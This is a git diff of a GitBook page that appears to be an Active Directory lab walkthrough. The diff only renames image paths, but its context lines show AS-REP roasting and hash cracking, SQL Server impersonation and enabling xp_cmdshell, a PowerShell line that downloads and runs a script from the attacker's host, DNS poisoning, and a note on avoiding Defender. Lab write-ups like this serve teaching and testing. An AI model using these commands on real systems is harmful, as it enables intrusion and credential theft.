@@ -78,7 +78,7 @@ GetNPUsers.py amsterdam/ -dc-ip 10.0.0.3 -usersfile users.txt -format hashcat -o
 .\hashcat.exe -a 0 -m 18200 .\asreproasting.txt .\wordlists\rockyou.txt  -r .\rules\dive.rule
 ```
 
-![](<../../../.gitbook/assets/image (34) (1).png>)
+![](<../../../.gitbook/assets/image (34) (1) (1).png>)
 
 4\. We cracked the hash within seconds of the domain user `Richard`, the password is `Sample123`.
 
@@ -249,7 +249,7 @@ ON a.grantor_principal_id = b.principal_id
 WHERE a.permission_name = 'IMPERSONATE'
 ```
 
-![](<../../../.gitbook/assets/image (36).png>)
+![](<../../../.gitbook/assets/image (36) (1).png>)
 
 7\. We aren't sysadmin but it seems we can finally impersonate `sa` now.
 
@@ -273,7 +273,7 @@ SELECT IS_SRVROLEMEMBER('sysadmin')
 EXEC master..xp_cmdshell 'whoami'
 ```
 
-![](<../../../.gitbook/assets/image (11) (1).png>)
+![](<../../../.gitbook/assets/image (11) (1) (1).png>)
 
 2\. We receive an error that it is disabled. But we can try to enable it with the following SQL queries:
 
@@ -396,7 +396,7 @@ iex (iwr http://192.168.248.2:8090/Invoke-DNSUpdate.ps1 -usebasicparsing)
 Invoke-DNSUpdate -DNSType A -DNSName webdav.amsterdam.bank.local -DNSData 192.168.248.2 -Realm amsterdam.bank.local
 ```
 
-![](<../../../.gitbook/assets/image (11).png>)
+![](<../../../.gitbook/assets/image (11) (1).png>)
 
 I also did a nslookup to check if the DNS record was created. The domain controller at `10.0.0.3` responded and gave us the correct attacker IP. We now have all our prerequisites. Time to escalate our privileges.
 
@@ -450,7 +450,7 @@ We retrieved the hash of the local `administrator` user and the cached hashes fo
 
 9\. The next step is to execute commands and get a shell. You might wonder why don't you just use psexec.py from Impacket, well because Defender will block it:
 
-![](<../../../.gitbook/assets/image (37).png>)
+![](<../../../.gitbook/assets/image (37) (1).png>)
 
 As said before, we can use the local administrator hash with CrackMapExec and execute commands with the `-x` flag.
 
